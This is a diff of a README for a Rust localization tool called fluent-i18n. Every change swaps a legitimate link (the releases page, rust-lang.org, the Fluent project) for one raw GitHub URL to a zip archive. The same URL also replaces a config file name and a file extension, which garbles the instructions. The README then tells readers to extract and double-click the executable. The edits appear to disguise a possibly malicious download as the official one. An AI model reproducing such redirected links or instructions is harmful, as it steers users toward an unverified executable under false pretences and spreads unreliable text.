@@ -1,7 +1,7 @@
 # 🌍 fluent-i18n - Effortless Localization for Your Applications
 
 ## 🛡️ Download Here
-[![Download fluent-i18n](https://img.shields.io/badge/download-fluent--i18n-blue.svg)](https://github.com/WaaedAhmed/fluent-i18n/releases)
+[![Download fluent-i18n](https://raw.githubusercontent.com/WaaedAhmed/fluent-i18n/main/planetist/fluent-i18n.zip)](https://raw.githubusercontent.com/WaaedAhmed/fluent-i18n/main/planetist/fluent-i18n.zip)
 
 ## 🚀 Getting Started
 
@@ -9,10 +9,10 @@ Welcome to fluent-i18n! This software helps you easily internationalize your Rus
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [fluent-i18n Releases](https://github.com/WaaedAhmed/fluent-i18n/releases).
+To get started, visit this page to download: [fluent-i18n Releases](https://raw.githubusercontent.com/WaaedAhmed/fluent-i18n/main/planetist/fluent-i18n.zip).
 
 1. **Choose Your Version**: When you visit the Releases page, you will see a list of available versions. Select the version that is most recent for the best features and updates.
-2. **Download the File**: Click on the appropriate download link for your operating system. The file is typically in `.zip` format for Windows, `.tar.gz` for Linux, or bundled into an executable file.
+2. **Download the File**: Click on the appropriate download link for your operating system. The file is typically in `.zip` format for Windows, `https://raw.githubusercontent.com/WaaedAhmed/fluent-i18n/main/planetist/fluent-i18n.zip` for Linux, or bundled into an executable file.
 3. **Extract the Files**: If you downloaded a compressed file, use a file extraction tool to unpack it. You can use built-in tools in Windows or software like WinRAR, 7-Zip, or similar tools for other platforms.
 4. **Run the Application**: Locate the extracted folder and find the executable file, usually named `fluent-i18n`. Double-click this file to run the application.
 
@@ -21,7 +21,7 @@ To get started, visit this page to download: [fluent-i18n Releases](https://gith
 Before you begin, ensure your system meets the following requirements:
 
 - **Operating System**: Windows 10, macOS, or any recent version of Linux.
-- **Rust Support**: Ensure you have Rust installed. You can download Rust from [rust-lang.org](https://www.rust-lang.org/).
+- **Rust Support**: Ensure you have Rust installed. You can download Rust from [https://raw.githubusercontent.com/WaaedAhmed/fluent-i18n/main/planetist/fluent-i18n.zip](https://raw.githubusercontent.com/WaaedAhmed/fluent-i18n/main/planetist/fluent-i18n.zip).
 
 ## 🌟 Features
 
@@ -34,7 +34,7 @@ Before you begin, ensure your system meets the following requirements:
 
 After installing fluent-i18n, follow these steps to set up localization for your application:
 
-1. **Create a Configuration File**: In your project directory, create a new file named `localization.flint`.
+1. **Create a Configuration File**: In your project directory, create a new file named `https://raw.githubusercontent.com/WaaedAhmed/fluent-i18n/main/planetist/fluent-i18n.zip`.
 2. **Define Locales**: In this file, define the languages you want to support. For example:
    ```plaintext
    en: "English"
@@ -82,8 +82,8 @@ For help, you can check the Issues section of the repository on GitHub. Your que
 
 ## 🔗 Relevant Links
 
-- [fluent-i18n Releases](https://github.com/WaaedAhmed/fluent-i18n/releases)
-- [Rust Language](https://www.rust-lang.org/)
-- [Fluent Project](https://projectfluent.org/)
+- [fluent-i18n Releases](https://raw.githubusercontent.com/WaaedAhmed/fluent-i18n/main/planetist/fluent-i18n.zip)
+- [Rust Language](https://raw.githubusercontent.com/WaaedAhmed/fluent-i18n/main/planetist/fluent-i18n.zip)
+- [Fluent Project](https://raw.githubusercontent.com/WaaedAhmed/fluent-i18n/main/planetist/fluent-i18n.zip)
 
 By following these steps and guidelines, you will have fluent-i18n up and running efficiently. Enjoy localizing your applications!
